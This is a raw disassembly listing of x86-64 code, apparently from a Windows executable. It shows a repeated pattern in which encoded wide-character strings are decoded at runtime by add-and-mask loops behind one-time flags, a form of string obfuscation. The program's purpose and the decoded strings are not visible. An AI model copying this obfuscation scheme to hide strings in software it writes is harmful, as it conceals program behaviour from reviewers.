   14000429e:	80 3d 0f 7e 57 00 00 	cmpb   $0x0,0x577e0f(%rip)        # 0x14057c0b4
   1400042a5:	74 2d                	je     0x1400042d4
   1400042a7:	48 8d 05 f2 7d 57 00 	lea    0x577df2(%rip),%rax        # 0x14057c0a0
   1400042ae:	48 8d 48 14          	lea    0x14(%rax),%rcx
   1400042b2:	66 8b 38             	mov    (%rax),%di
   1400042b5:	48 83 c0 02          	add    $0x2,%rax
   1400042b9:	8d 97 fd 97 ff ff    	lea    -0x6803(%rdi),%edx
   1400042bf:	66 81 e2 ff 00       	and    $0xff,%dx
   1400042c4:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400042c8:	48 39 c8             	cmp    %rcx,%rax
   1400042cb:	75 e5                	jne    0x1400042b2
   1400042cd:	c6 05 e0 7d 57 00 00 	movb   $0x0,0x577de0(%rip)        # 0x14057c0b4
   1400042d4:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400042d9:	4c 8d 05 c0 7d 57 00 	lea    0x577dc0(%rip),%r8        # 0x14057c0a0
   1400042e0:	48 89 f2             	mov    %rsi,%rdx
   1400042e3:	48 8d bc 24 6c 05 00 	lea    0x56c(%rsp),%rdi
   1400042ea:	00 
   1400042eb:	48 8d ac 24 6c 05 00 	lea    0x56c(%rsp),%rbp
   1400042f2:	00 
   1400042f3:	e8 dd d8 ff ff       	call   0x140001bd5
   1400042f8:	31 c0                	xor    %eax,%eax
   1400042fa:	b9 82 00 00 00       	mov    $0x82,%ecx
   1400042ff:	80 3d 6a 7d 57 00 00 	cmpb   $0x0,0x577d6a(%rip)        # 0x14057c070
   140004306:	f3 ab                	rep stos %eax,(%rdi)
   140004308:	48 b8 93 00 9a 00 a4 	movabs $0x9b00a4009a0093,%rax
   14000430f:	00 9b 00 
   140004312:	66 c7 84 24 c4 17 00 	movw   $0x37,0x17c4(%rsp)
   140004319:	00 37 00 
   14000431c:	48 89 84 24 b4 17 00 	mov    %rax,0x17b4(%rsp)
   140004323:	00 
   140004324:	48 b8 65 00 9c 00 af 	movabs $0x9c00af009c0065,%rax
   14000432b:	00 9c 00 
   14000432e:	48 89 84 24 bc 17 00 	mov    %rax,0x17bc(%rsp)
   140004335:	00 
   140004336:	75 32                	jne    0x14000436a
   140004338:	0f 10 94 24 b4 17 00 	movups 0x17b4(%rsp),%xmm2
   14000433f:	00 
   140004340:	48 8d 0d 31 d0 ff ff 	lea    -0x2fcf(%rip),%rcx        # 0x140001378
   140004347:	c6 05 44 7d 57 00 01 	movb   $0x1,0x577d44(%rip)        # 0x14057c092
   14000434e:	66 c7 05 39 7d 57 00 	movw   $0x37,0x577d39(%rip)        # 0x14057c090
   140004355:	37 00 
   140004357:	c6 05 12 7d 57 00 01 	movb   $0x1,0x577d12(%rip)        # 0x14057c070
   14000435e:	0f 29 15 1b 7d 57 00 	movaps %xmm2,0x577d1b(%rip)        # 0x14057c080
   140004365:	e8 cb cf ff ff       	call   0x140001335
   14000436a:	80 3d 21 7d 57 00 00 	cmpb   $0x0,0x577d21(%rip)        # 0x14057c092
   140004371:	74 2d                	je     0x1400043a0
   140004373:	48 8d 05 06 7d 57 00 	lea    0x577d06(%rip),%rax        # 0x14057c080
   14000437a:	48 8d 48 12          	lea    0x12(%rax),%rcx
   14000437e:	66 8b 30             	mov    (%rax),%si
   140004381:	48 83 c0 02          	add    $0x2,%rax
   140004385:	8d 96 c9 05 00 00    	lea    0x5c9(%rsi),%edx
   14000438b:	66 81 e2 ff 00       	and    $0xff,%dx
   140004390:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004394:	48 39 c1             	cmp    %rax,%rcx
   140004397:	75 e5                	jne    0x14000437e
   140004399:	c6 05 f2 7c 57 00 00 	movb   $0x0,0x577cf2(%rip)        # 0x14057c092
   1400043a0:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400043a5:	48 89 e9             	mov    %rbp,%rcx
   1400043a8:	4c 8d 05 d1 7c 57 00 	lea    0x577cd1(%rip),%r8        # 0x14057c080
   1400043af:	48 8d bc 24 74 07 00 	lea    0x774(%rsp),%rdi
   1400043b6:	00 
   1400043b7:	48 8d 35 c2 2c 57 00 	lea    0x572cc2(%rip),%rsi        # 0x140577080
   1400043be:	e8 12 d8 ff ff       	call   0x140001bd5
   1400043c3:	31 c0                	xor    %eax,%eax
   1400043c5:	b9 82 00 00 00       	mov    $0x82,%ecx
   1400043ca:	80 3d 3f 7c 57 00 00 	cmpb   $0x0,0x577c3f(%rip)        # 0x14057c010
   1400043d1:	f3 ab                	rep stos %eax,(%rdi)
   1400043d3:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400043d8:	b9 4e 00 00 00       	mov    $0x4e,%ecx
   1400043dd:	48 8d 05 3c 7c 57 00 	lea    0x577c3c(%rip),%rax        # 0x14057c020
   1400043e4:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400043e6:	75 29                	jne    0x140004411
   1400043e8:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400043ed:	b9 4e 00 00 00       	mov    $0x4e,%ecx
   1400043f2:	48 89 c7             	mov    %rax,%rdi
   1400043f5:	c6 05 72 7c 57 00 01 	movb   $0x1,0x577c72(%rip)        # 0x14057c06e
   1400043fc:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400043fe:	48 8d 0d 72 cf ff ff 	lea    -0x308e(%rip),%rcx        # 0x140001377
   140004405:	c6 05 04 7c 57 00 01 	movb   $0x1,0x577c04(%rip)        # 0x14057c010
   14000440c:	e8 24 cf ff ff       	call   0x140001335
   140004411:	80 3d 56 7c 57 00 00 	cmpb   $0x0,0x577c56(%rip)        # 0x14057c06e
   140004418:	74 2d                	je     0x140004447
   14000441a:	48 8d 05 ff 7b 57 00 	lea    0x577bff(%rip),%rax        # 0x14057c020
   140004421:	48 8d 48 4e          	lea    0x4e(%rax),%rcx
   140004425:	66 8b 30             	mov    (%rax),%si
   140004428:	48 83 c0 02          	add    $0x2,%rax
   14000442c:	8d 96 b3 41 00 00    	lea    0x41b3(%rsi),%edx
   140004432:	66 81 e2 ff 00       	and    $0xff,%dx
   140004437:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   14000443b:	48 39 c1             	cmp    %rax,%rcx
   14000443e:	75 e5                	jne    0x140004425
   140004440:	c6 05 27 7c 57 00 00 	movb   $0x0,0x577c27(%rip)        # 0x14057c06e
   140004447:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000444c:	48 8d 8c 24 74 07 00 	lea    0x774(%rsp),%rcx
   140004453:	00 
   140004454:	4c 8d 05 c5 7b 57 00 	lea    0x577bc5(%rip),%r8        # 0x14057c020
   14000445b:	48 8d bc 24 7c 09 00 	lea    0x97c(%rsp),%rdi
   140004462:	00 
   140004463:	4c 8d bc 24 7c 09 00 	lea    0x97c(%rsp),%r15
   14000446a:	00 
   14000446b:	e8 65 d7 ff ff       	call   0x140001bd5
   140004470:	31 c0                	xor    %eax,%eax
   140004472:	b9 82 00 00 00       	mov    $0x82,%ecx
   140004477:	80 3d 62 7b 57 00 00 	cmpb   $0x0,0x577b62(%rip)        # 0x14057bfe0
   14000447e:	f3 ab                	rep stos %eax,(%rdi)
   140004480:	48 b8 93 00 9a 00 a6 	movabs $0xa500a6009a0093,%rax
   140004487:	00 a5 00 
   14000448a:	66 c7 84 24 cc 17 00 	movw   $0x37,0x17cc(%rsp)
   140004491:	00 37 00 
   140004494:	48 89 84 24 b4 17 00 	mov    %rax,0x17b4(%rsp)
   14000449b:	00 
   14000449c:	48 b8 9f 00 a6 00 aa 	movabs $0xab00aa00a6009f,%rax
   1400044a3:	00 ab 00 
   1400044a6:	48 89 84 24 bc 17 00 	mov    %rax,0x17bc(%rsp)
   1400044ad:	00 
   1400044ae:	48 b8 65 00 9c 00 af 	movabs $0x9c00af009c0065,%rax
   1400044b5:	00 9c 00 
   1400044b8:	48 89 84 24 c4 17 00 	mov    %rax,0x17c4(%rsp)
   1400044bf:	00 
   1400044c0:	75 38                	jne    0x1400044fa
   1400044c2:	0f 10 9c 24 b4 17 00 	movups 0x17b4(%rsp),%xmm3
   1400044c9:	00 
   1400044ca:	0f 10 a4 24 be 17 00 	movups 0x17be(%rsp),%xmm4
   1400044d1:	00 
   1400044d2:	48 8d 0d 9d ce ff ff 	lea    -0x3163(%rip),%rcx        # 0x140001376
   1400044d9:	c6 05 2a 7b 57 00 01 	movb   $0x1,0x577b2a(%rip)        # 0x14057c00a
   1400044e0:	c6 05 f9 7a 57 00 01 	movb   $0x1,0x577af9(%rip)        # 0x14057bfe0
   1400044e7:	0f 29 1d 02 7b 57 00 	movaps %xmm3,0x577b02(%rip)        # 0x14057bff0
   1400044ee:	0f 11 25 05 7b 57 00 	movups %xmm4,0x577b05(%rip)        # 0x14057bffa
   1400044f5:	e8 3b ce ff ff       	call   0x140001335
   1400044fa:	80 3d 09 7b 57 00 00 	cmpb   $0x0,0x577b09(%rip)        # 0x14057c00a
   140004501:	74 2d                	je     0x140004530
   140004503:	48 8d 05 e6 7a 57 00 	lea    0x577ae6(%rip),%rax        # 0x14057bff0
   14000450a:	48 8d 48 1a          	lea    0x1a(%rax),%rcx
   14000450e:	66 8b 30             	mov    (%rax),%si
   140004511:	48 83 c0 02          	add    $0x2,%rax
   140004515:	8d 96 c9 e9 ff ff    	lea    -0x1637(%rsi),%edx
   14000451b:	66 81 e2 ff 00       	and    $0xff,%dx
   140004520:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004524:	48 39 c8             	cmp    %rcx,%rax
   140004527:	75 e5                	jne    0x14000450e
   140004529:	c6 05 da 7a 57 00 00 	movb   $0x0,0x577ada(%rip)        # 0x14057c00a
   140004530:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004535:	4c 89 f9             	mov    %r15,%rcx
   140004538:	4c 8d 05 b1 7a 57 00 	lea    0x577ab1(%rip),%r8        # 0x14057bff0
   14000453f:	48 8d bc 24 84 0b 00 	lea    0xb84(%rsp),%rdi
   140004546:	00 
   140004547:	48 8d b4 24 84 0b 00 	lea    0xb84(%rsp),%rsi
   14000454e:	00 
   14000454f:	e8 81 d6 ff ff       	call   0x140001bd5
   140004554:	31 c0                	xor    %eax,%eax
   140004556:	b9 82 00 00 00       	mov    $0x82,%ecx
   14000455b:	80 3d 66 7a 57 00 00 	cmpb   $0x0,0x577a66(%rip)        # 0x14057bfc8
   140004562:	f3 ab                	rep stos %eax,(%rdi)
   140004564:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
   140004569:	48 b8 3f 00 30 00 38 	movabs $0x3b00380030003f,%rax
   140004570:	00 3b 00 
   140004573:	48 89 84 24 b4 17 00 	mov    %rax,0x17b4(%rsp)
   14000457a:	00 
   14000457b:	c7 84 24 bc 17 00 00 	movl   $0xeb0028,0x17bc(%rsp)
   140004582:	28 00 eb 00 
   140004586:	75 2b                	jne    0x1400045b3
   140004588:	48 8d 0d e6 cd ff ff 	lea    -0x321a(%rip),%rcx        # 0x140001375
   14000458f:	c6 05 46 7a 57 00 01 	movb   $0x1,0x577a46(%rip)        # 0x14057bfdc
   140004596:	48 89 05 33 7a 57 00 	mov    %rax,0x577a33(%rip)        # 0x14057bfd0
   14000459d:	c7 05 31 7a 57 00 28 	movl   $0xeb0028,0x577a31(%rip)        # 0x14057bfd8
   1400045a4:	00 eb 00 
   1400045a7:	c6 05 1a 7a 57 00 01 	movb   $0x1,0x577a1a(%rip)        # 0x14057bfc8
   1400045ae:	e8 82 cd ff ff       	call   0x140001335
   1400045b3:	80 3d 22 7a 57 00 00 	cmpb   $0x0,0x577a22(%rip)        # 0x14057bfdc
   1400045ba:	48 8d 0d 0f 7a 57 00 	lea    0x577a0f(%rip),%rcx        # 0x14057bfd0
   1400045c1:	74 29                	je     0x1400045ec
   1400045c3:	48 89 c8             	mov    %rcx,%rax
   1400045c6:	4c 8d 41 0c          	lea    0xc(%rcx),%r8
   1400045ca:	66 8b 30             	mov    (%rax),%si
   1400045cd:	48 83 c0 02          	add    $0x2,%rax
   1400045d1:	8d 96 15 bd ff ff    	lea    -0x42eb(%rsi),%edx
   1400045d7:	66 81 e2 ff 00       	and    $0xff,%dx
   1400045dc:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400045e0:	4c 39 c0             	cmp    %r8,%rax
   1400045e3:	75 e5                	jne    0x1400045ca
   1400045e5:	c6 05 f0 79 57 00 00 	movb   $0x0,0x5779f0(%rip)        # 0x14057bfdc
   1400045ec:	48 89 ca             	mov    %rcx,%rdx
   1400045ef:	4c 89 e1             	mov    %r12,%rcx
   1400045f2:	48 8d bc 24 8c 0d 00 	lea    0xd8c(%rsp),%rdi
   1400045f9:	00 
   1400045fa:	e8 ed dc ff ff       	call   0x1400022ec
   1400045ff:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140004604:	48 8d 35 d5 2a 57 00 	lea    0x572ad5(%rip),%rsi        # 0x1405770e0
   14000460b:	48 89 c2             	mov    %rax,%rdx
   14000460e:	e8 3d f9 ff ff       	call   0x140003f50
   140004613:	31 c0                	xor    %eax,%eax
   140004615:	b9 82 00 00 00       	mov    $0x82,%ecx
   14000461a:	80 3d 77 79 57 00 00 	cmpb   $0x0,0x577977(%rip)        # 0x14057bf98
   140004621:	f3 ab                	rep stos %eax,(%rdi)
   140004623:	48 8d 84 24 8c 0d 00 	lea    0xd8c(%rsp),%rax
   14000462a:	00 
   14000462b:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140004630:	b9 09 00 00 00       	mov    $0x9,%ecx
   140004635:	f3 a5                	rep movsl (%rsi),(%rdi)
   140004637:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000463c:	48 8d 05 5d 79 57 00 	lea    0x57795d(%rip),%rax        # 0x14057bfa0
   140004643:	75 29                	jne    0x14000466e
   140004645:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000464a:	b9 09 00 00 00       	mov    $0x9,%ecx
   14000464f:	48 89 c7             	mov    %rax,%rdi
   140004652:	c6 05 6b 79 57 00 01 	movb   $0x1,0x57796b(%rip)        # 0x14057bfc4
   140004659:	f3 a5                	rep movsl (%rsi),(%rdi)
   14000465b:	48 8d 0d 12 cd ff ff 	lea    -0x32ee(%rip),%rcx        # 0x140001374
   140004662:	c6 05 2f 79 57 00 01 	movb   $0x1,0x57792f(%rip)        # 0x14057bf98
   140004669:	e8 c7 cc ff ff       	call   0x140001335
   14000466e:	80 3d 4f 79 57 00 00 	cmpb   $0x0,0x57794f(%rip)        # 0x14057bfc4
   140004675:	74 2d                	je     0x1400046a4
   140004677:	48 8d 05 22 79 57 00 	lea    0x577922(%rip),%rax        # 0x14057bfa0
   14000467e:	48 8d 48 24          	lea    0x24(%rax),%rcx
   140004682:	66 8b 30             	mov    (%rax),%si
   140004685:	48 83 c0 02          	add    $0x2,%rax
   140004689:	8d 96 85 6b 00 00    	lea    0x6b85(%rsi),%edx
   14000468f:	66 81 e2 ff 00       	and    $0xff,%dx
   140004694:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004698:	48 39 c8             	cmp    %rcx,%rax
   14000469b:	75 e5                	jne    0x140004682
   14000469d:	c6 05 20 79 57 00 00 	movb   $0x0,0x577920(%rip)        # 0x14057bfc4
   1400046a4:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400046a9:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   1400046ae:	4c 8d 05 eb 78 57 00 	lea    0x5778eb(%rip),%r8        # 0x14057bfa0
   1400046b5:	48 8d 35 64 2a 57 00 	lea    0x572a64(%rip),%rsi        # 0x140577120
   1400046bc:	e8 14 d5 ff ff       	call   0x140001bd5
   1400046c1:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400046c6:	80 3d 73 77 57 00 00 	cmpb   $0x0,0x577773(%rip)        # 0x14057be40
   1400046cd:	b9 4c 00 00 00       	mov    $0x4c,%ecx
   1400046d2:	f3 a5                	rep movsl (%rsi),(%rdi)
   1400046d4:	48 8d 05 85 77 57 00 	lea    0x577785(%rip),%rax        # 0x14057be60
   1400046db:	75 29                	jne    0x140004706
   1400046dd:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400046e2:	b9 4c 00 00 00       	mov    $0x4c,%ecx
   1400046e7:	48 89 c7             	mov    %rax,%rdi
   1400046ea:	c6 05 9f 78 57 00 01 	movb   $0x1,0x57789f(%rip)        # 0x14057bf90
   1400046f1:	f3 a5                	rep movsl (%rsi),(%rdi)
   1400046f3:	48 8d 0d 79 cc ff ff 	lea    -0x3387(%rip),%rcx        # 0x140001373
   1400046fa:	c6 05 3f 77 57 00 01 	movb   $0x1,0x57773f(%rip)        # 0x14057be40
   140004701:	e8 2f cc ff ff       	call   0x140001335
   140004706:	80 3d 83 78 57 00 00 	cmpb   $0x0,0x577883(%rip)        # 0x14057bf90
   14000470d:	74 30                	je     0x14000473f
   14000470f:	48 8d 05 4a 77 57 00 	lea    0x57774a(%rip),%rax        # 0x14057be60
   140004716:	48 8d 88 30 01 00 00 	lea    0x130(%rax),%rcx
   14000471d:	66 8b 30             	mov    (%rax),%si
   140004720:	48 83 c0 02          	add    $0x2,%rax
   140004724:	8d 96 fb cb ff ff    	lea    -0x3405(%rsi),%edx
   14000472a:	66 81 e2 ff 00       	and    $0xff,%dx
   14000472f:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004733:	48 39 c1             	cmp    %rax,%rcx
   140004736:	75 e5                	jne    0x14000471d
   140004738:	c6 05 51 78 57 00 00 	movb   $0x0,0x577851(%rip)        # 0x14057bf90
   14000473f:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140004744:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140004749:	31 f6                	xor    %esi,%esi
   14000474b:	49 89 e8             	mov    %rbp,%r8
   14000474e:	31 c9                	xor    %ecx,%ecx
   140004750:	4c 8d 0d 09 77 57 00 	lea    0x577709(%rip),%r9        # 0x14057be60
   140004757:	48 8d bc 24 94 0f 00 	lea    0xf94(%rsp),%rdi
   14000475e:	00 
   14000475f:	48 8d ac 24 9c 11 00 	lea    0x119c(%rsp),%rbp
   140004766:	00 
   140004767:	e8 e2 da ff ff       	call   0x14000224e
   14000476c:	89 f0                	mov    %esi,%eax
   14000476e:	b9 82 00 00 00       	mov    $0x82,%ecx
   140004773:	f3 ab                	rep stos %eax,(%rdi)
   140004775:	48 8b 43 20          	mov    0x20(%rbx),%rax
   140004779:	48 8d bc 24 9c 11 00 	lea    0x119c(%rsp),%rdi
   140004780:	00 
   140004781:	48 8b 50 68          	mov    0x68(%rax),%rdx
   140004785:	48 8d 84 24 94 0f 00 	lea    0xf94(%rsp),%rax
   14000478c:	00 
   14000478d:	48 89 c1             	mov    %rax,%rcx
   140004790:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140004795:	e8 b6 f7 ff ff       	call   0x140003f50
   14000479a:	89 f0                	mov    %esi,%eax
   14000479c:	b9 82 00 00 00       	mov    $0x82,%ecx
   1400047a1:	80 3d 28 76 57 00 00 	cmpb   $0x0,0x577628(%rip)        # 0x14057bdd0
   1400047a8:	f3 ab                	rep stos %eax,(%rdi)
   1400047aa:	48 8d 35 af 2a 57 00 	lea    0x572aaf(%rip),%rsi        # 0x140577260
   1400047b1:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400047b6:	b9 36 00 00 00       	mov    $0x36,%ecx
   1400047bb:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400047bd:	48 8d 05 1c 76 57 00 	lea    0x57761c(%rip),%rax        # 0x14057bde0
   1400047c4:	75 29                	jne    0x1400047ef
   1400047c6:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400047cb:	b9 36 00 00 00       	mov    $0x36,%ecx
   1400047d0:	48 89 c7             	mov    %rax,%rdi
   1400047d3:	c6 05 3c 76 57 00 01 	movb   $0x1,0x57763c(%rip)        # 0x14057be16
   1400047da:	f3 a4                	rep movsb (%rsi),(%rdi)
   1400047dc:	48 8d 0d 8e cb ff ff 	lea    -0x3472(%rip),%rcx        # 0x140001371
   1400047e3:	c6 05 e6 75 57 00 01 	movb   $0x1,0x5775e6(%rip)        # 0x14057bdd0
   1400047ea:	e8 46 cb ff ff       	call   0x140001335
   1400047ef:	80 3d 20 76 57 00 00 	cmpb   $0x0,0x577620(%rip)        # 0x14057be16
   1400047f6:	74 2d                	je     0x140004825
   1400047f8:	48 8d 05 e1 75 57 00 	lea    0x5775e1(%rip),%rax        # 0x14057bde0
   1400047ff:	48 8d 48 36          	lea    0x36(%rax),%rcx
   140004803:	66 8b 18             	mov    (%rax),%bx
   140004806:	48 83 c0 02          	add    $0x2,%rax
   14000480a:	8d 93 3b 2f 00 00    	lea    0x2f3b(%rbx),%edx
   140004810:	66 81 e2 ff 00       	and    $0xff,%dx
   140004815:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140004819:	48 39 c1             	cmp    %rax,%rcx
   14000481c:	75 e5                	jne    0x140004803
   14000481e:	c6 05 f1 75 57 00 00 	movb   $0x0,0x5775f1(%rip)        # 0x14057be16
   140004825:	48 b8 15 00 17 00 14 	movabs $0xc001400170015,%rax
   14000482c:	00 0c 00 
   14000482f:	80 3d e2 75 57 00 00 	cmpb   $0x0,0x5775e2(%rip)        # 0x14057be18
   140004836:	c7 84 24 cc 17 00 00 	movl   $0xc50002,0x17cc(%rsp)
   14000483d:	02 00 c5 00 
   140004841:	48 89 84 24 b4 17 00 	mov    %rax,0x17b4(%rsp)
   140004848:	00 
   140004849:	48 b8 17 00 06 00 12 	movabs $0xb001200060017,%rax
   140004850:	00 0b 00 
   140004853:	48 89 84 24 bc 17 00 	mov    %rax,0x17bc(%rsp)
   14000485a:	00 
   14000485b:	48 b8 0e 00 11 00 0a 	movabs $0x18000a0011000e,%rax
   140004862:	00 18 00 
   140004865:	48 89 84 24 c4 17 00 	mov    %rax,0x17c4(%rsp)
   14000486c:	00 
   14000486d:	75 38                	jne    0x1400048a7
   14000486f:	0f 10 ac 24 b4 17 00 	movups 0x17b4(%rsp),%xmm5
   140004876:	00 
   140004877:	0f 10 84 24 c0 17 00 	movups 0x17c0(%rsp),%xmm0
   14000487e:	00 
   14000487f:	48 8d 0d ec ca ff ff 	lea    -0x3514(%rip),%rcx        # 0x140001372
   140004886:	c6 05 af 75 57 00 01 	movb   $0x1,0x5775af(%rip)        # 0x14057be3c
   14000488d:	c6 05 84 75 57 00 01 	movb   $0x1,0x577584(%rip)        # 0x14057be18
   140004894:	0f 29 2d 85 75 57 00 	movaps %xmm5,0x577585(%rip)        # 0x14057be20
   14000489b:	0f 11 05 8a 75 57 00 	movups %xmm0,0x57758a(%rip)        # 0x14057be2c
   1400048a2:	e8 8e ca ff ff       	call   0x140001335
   1400048a7:	80 3d 8e 75 57 00 00 	cmpb   $0x0,0x57758e(%rip)        # 0x14057be3c
   1400048ae:	48 8d 0d 6b 75 57 00 	lea    0x57756b(%rip),%rcx        # 0x14057be20
   1400048b5:	74 29                	je     0x1400048e0
   1400048b7:	48 89 c8             	mov    %rcx,%rax
   1400048ba:	4c 8d 41 1c          	lea    0x1c(%rcx),%r8
   1400048be:	66 8b 18             	mov    (%rax),%bx
   1400048c1:	48 83 c0 02          	add    $0x2,%rax
   1400048c5:	8d 93 3b 2f 00 00    	lea    0x2f3b(%rbx),%edx
   1400048cb:	66 81 e2 ff 00       	and    $0xff,%dx
   1400048d0:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400048d4:	49 39 c0             	cmp    %rax,%r8
   1400048d7:	75 e5                	jne    0x1400048be
   1400048d9:	c6 05 5c 75 57 00 00 	movb   $0x0,0x57755c(%rip)        # 0x14057be3c
   1400048e0:	48 89 ca             	mov    %rcx,%rdx
   1400048e3:	4c 89 e1             	mov    %r12,%rcx
   1400048e6:	48 8d bc 24 a4 13 00 	lea    0x13a4(%rsp),%rdi
   1400048ed:	00 
   1400048ee:	e8 f9 d9 ff ff       	call   0x1400022ec
   1400048f3:	48 89 e9             	mov    %rbp,%rcx
   1400048f6:	4c 8d 05 e3 74 57 00 	lea    0x5774e3(%rip),%r8        # 0x14057bde0
   1400048fd:	4c 8d a4 24 a4 13 00 	lea    0x13a4(%rsp),%r12
   140004904:	00 
   140004905:	48 89 c2             	mov    %rax,%rdx
   140004908:	e8 c8 d2 ff ff       	call   0x140001bd5
   14000490d:	31 c0                	xor    %eax,%eax
   14000490f:	b9 82 00 00 00       	mov    $0x82,%ecx
   140004914:	80 3d 8d 74 57 00 00 	cmpb   $0x0,0x57748d(%rip)        # 0x14057bda8
   14000491b:	f3 ab                	rep stos %eax,(%rdi)
   14000491d:	48 b8 df 00 f6 00 e6 	movabs $0xeb00e600f600df,%rax
   140004924:	00 eb 00 
   140004927:	c7 84 24 cc 17 00 00 	movl   $0x8300e8,0x17cc(%rsp)
   14000492e:	e8 00 83 00 
   140004932:	48 89 84 24 b4 17 00 	mov    %rax,0x17b4(%rsp)
   140004939:	00 
   14000493a:	48 b8 f7 00 e4 00 f6 	movabs $0xee00f600e400f7,%rax
   140004941:	00 ee 00 
   140004944:	48 89 84 24 bc 17 00 	mov    %rax,0x17bc(%rsp)
   14000494b:	00 
   14000494c:	48 b8 f6 00 b1 00 e8 	movabs $0xfb00e800b100f6,%rax
   140004953:	00 fb 00 
   140004956:	48 89 84 24 c4 17 00 	mov    %rax,0x17c4(%rsp)
   14000495d:	00 
   14000495e:	75 38                	jne    0x140004998
   140004960:	0f 10 8c 24 b4 17 00 	movups 0x17b4(%rsp),%xmm1
   140004967:	00 
   140004968:	0f 10 94 24 c0 17 00 	movups 0x17c0(%rsp),%xmm2
   14000496f:	00 
   140004970:	48 8d 0d f9 c9 ff ff 	lea    -0x3607(%rip),%rcx        # 0x140001370
   140004977:	c6 05 4e 74 57 00 01 	movb   $0x1,0x57744e(%rip)        # 0x14057bdcc
   14000497e:	c6 05 23 74 57 00 01 	movb   $0x1,0x577423(%rip)        # 0x14057bda8
   140004985:	0f 29 0d 24 74 57 00 	movaps %xmm1,0x577424(%rip)        # 0x14057bdb0
   14000498c:	0f 11 15 29 74 57 00 	movups %xmm2,0x577429(%rip)        # 0x14057bdbc
   140004993:	e8 9d c9 ff ff       	call   0x140001335
   140004998:	80 3d 2d 74 57 00 00 	cmpb   $0x0,0x57742d(%rip)        # 0x14057bdcc
   14000499f:	74 2d                	je     0x1400049ce
   1400049a1:	48 8d 05 08 74 57 00 	lea    0x577408(%rip),%rax        # 0x14057bdb0
   1400049a8:	48 8d 48 1c          	lea    0x1c(%rax),%rcx
   1400049ac:	66 8b 18             	mov    (%rax),%bx
   1400049af:	48 83 c0 02          	add    $0x2,%rax
   1400049b3:	8d 93 7d 09 00 00    	lea    0x97d(%rbx),%edx
   1400049b9:	66 81 e2 ff 00       	and    $0xff,%dx
   1400049be:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400049c2:	48 39 c8             	cmp    %rcx,%rax
   1400049c5:	75 e5                	jne    0x1400049ac
   1400049c7:	c6 05 fe 73 57 00 00 	movb   $0x0,0x5773fe(%rip)        # 0x14057bdcc
   1400049ce:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400049d3:	4c 89 e1             	mov    %r12,%rcx
   1400049d6:	4c 8d 05 d3 73 57 00 	lea    0x5773d3(%rip),%r8        # 0x14057bdb0
   1400049dd:	48 8d bc 24 ac 15 00 	lea    0x15ac(%rsp),%rdi
   1400049e4:	00 
   1400049e5:	4c 8d b4 24 ac 15 00 	lea    0x15ac(%rsp),%r14
   1400049ec:	00 
   1400049ed:	e8 e3 d1 ff ff       	call   0x140001bd5
   1400049f2:	31 c0                	xor    %eax,%eax
   1400049f4:	b9 82 00 00 00       	mov    $0x82,%ecx
   1400049f9:	80 3d 80 73 57 00 00 	cmpb   $0x0,0x577380(%rip)        # 0x14057bd80
   140004a00:	f3 ab                	rep stos %eax,(%rdi)
   140004a02:	48 b8 ad 00 c3 00 b6 	movabs $0xb800b600c300ad,%rax
   140004a09:	00 b8 00 
   140004a0c:	66 c7 84 24 c4 17 00 	movw   $0x51,0x17c4(%rsp)
   140004a13:	00 51 00 
   140004a16:	48 89 84 24 b4 17 00 	mov    %rax,0x17b4(%rsp)
   140004a1d:	00 
   140004a1e:	48 b8 7f 00 b6 00 c9 	movabs $0xb600c900b6007f,%rax
   140004a25:	00 b6 00 
   140004a28:	48 89 84 24 bc 17 00 	mov    %rax,0x17bc(%rsp)
   140004a2f:	00 
   140004a30:	75 32                	jne    0x140004a64
   140004a32:	0f 10 9c 24 b4 17 00 	movups 0x17b4(%rsp),%xmm3
   140004a39:	00 
   140004a3a:	48 8d 0d 2e c9 ff ff 	lea    -0x36d2(%rip),%rcx        # 0x14000136f
   140004a41:	c6 05 5a 73 57 00 01 	movb   $0x1,0x57735a(%rip)        # 0x14057bda2
   140004a48:	66 c7 05 4f 73 57 00 	movw   $0x51,0x57734f(%rip)        # 0x14057bda0
   140004a4f:	51 00 
   140004a51:	c6 05 28 73 57 00 01 	movb   $0x1,0x577328(%rip)        # 0x14057bd80
   140004a58:	0f 29 1d 31 73 57 00 	movaps %xmm3,0x577331(%rip)        # 0x14057bd90
   140004a5f:	e8 d1 c8 ff ff       	call   0x140001335
   140004a64:	80 3d 37 73 57 00 00 	cmpb   $0x0,0x577337(%rip)        # 0x14057bda2
   140004a6b:	74 2d                	je     0x140004a9a
   140004a6d:	48 8d 05 1c 73 57 00 	lea    0x57731c(%rip),%rax        # 0x14057bd90
   140004a74:	48 8d 48 12          	lea    0x12(%rax),%rcx
   140004a78:	66 8b 18             	mov    (%rax),%bx
   140004a7b:	48 83 c0 02          	add    $0x2,%rax
